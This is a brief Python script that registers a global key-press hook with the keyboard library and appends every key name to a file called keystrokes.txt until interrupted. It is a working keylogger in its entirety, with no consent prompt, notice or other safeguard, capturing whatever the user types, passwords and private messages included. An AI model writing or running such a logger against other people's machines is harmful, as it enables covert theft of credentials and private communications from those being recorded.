import keyboard


def main() -> None:
	log_file: str = 'keystrokes.txt'

	def on_key_press(event) -> None:
		with open(log_file, 'a') as logger:
			logger.write(f'{event.name}\n')

	keyboard.on_press(on_key_press)
	keyboard.wait()


if __name__ == '__main__':
	main()
